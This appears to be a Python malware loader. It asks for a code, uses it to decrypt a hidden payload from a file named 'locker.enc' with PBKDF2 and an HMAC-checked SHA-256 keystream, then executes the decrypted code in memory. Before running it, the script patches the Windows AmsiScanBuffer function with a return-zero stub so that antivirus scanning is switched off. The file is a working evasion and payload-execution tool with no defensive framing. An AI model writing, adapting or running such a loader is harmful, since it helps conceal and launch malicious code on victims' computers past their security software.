import os, sys, hashlib, hmac, base64, ctypes

SALT = base64.b64decode("vwjMuPDe5MusdXhtgHUQZg==")
NONCE = base64.b64decode("ZpKEM5dgeoV4PyLV6XWozQ==")
TAG = base64.b64decode("crhtiCJhBz5Uu2yzHyHoqKpTL720RcNnEd5prxdBPlI=")
ITERATIONS = 300000

def kdf(password, salt, length=64):
    return hashlib.pbkdf2_hmac("sha256", password, salt, ITERATIONS, dklen=length)

def keystream(key, nonce, length):
    out = bytearray()
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(key + nonce + counter.to_bytes(8, "big")).digest()
        counter += 1
    return bytes(out[:length])

def decrypt(password, ct):
    keys = kdf(password, SALT)
    enc_key, mac_key = keys[:32], keys[32:]
    expected = hmac.new(mac_key, SALT + NONCE + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(expected, TAG):
        raise ValueError("bad tag")
    ks = keystream(enc_key, NONCE, len(ct))
    return bytes(a ^ b for a, b in zip(ct, ks))

if __name__ == "__main__":
    pw = input("code: ").encode()
    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "locker.enc"), "rb") as f:
        data = f.read()
    ct = data[64:]
    try:
        code = decrypt(pw, ct)
    except Exception:
        print("wrong code")
        sys.exit(1)
    try:
        k32 = ctypes.windll.kernel32
        h = k32.GetModuleHandleW("amsi.dll")
        if h:
            addr = k32.GetProcAddress(h, b"AmsiScanBuffer")
            old = ctypes.c_ulong()
            k32.VirtualProtect(addr, 3, 0x40, ctypes.byref(old))
            ctypes.memmove(addr, b"\x31\xc0\xc3", 3)
            k32.VirtualProtect(addr, 3, old.value, ctypes.byref(old))
    except Exception:
        pass
    exec(compile(code, "\u003clocked\u003e", "exec"), {"__name__": "__main__", "__file__": __file__})
